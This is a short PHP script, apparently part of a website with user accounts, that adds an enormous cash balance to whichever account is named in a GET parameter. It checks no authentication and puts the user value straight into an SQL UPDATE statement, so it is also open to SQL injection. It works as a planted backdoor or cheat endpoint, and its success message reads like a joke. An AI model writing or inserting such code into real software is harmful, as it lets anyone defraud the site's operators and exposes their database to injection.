<?php
if(isset($_GET['user'])){
	require_once(realpath($_SERVER["DOCUMENT_ROOT"]) .'/core/init.php');
	$user = $_GET['user'];
	$sql_info_web = "UPDATE accounts SET cash = cash + 999999999999999999999 WHERE taikhoan='$user'";
    $db->query($sql_info_web);
    $db->close();
    echo json_encode(array('status' => "success", 'title' => "Thành công", 'msg' => "hjhjhjhjhj"));
}
?>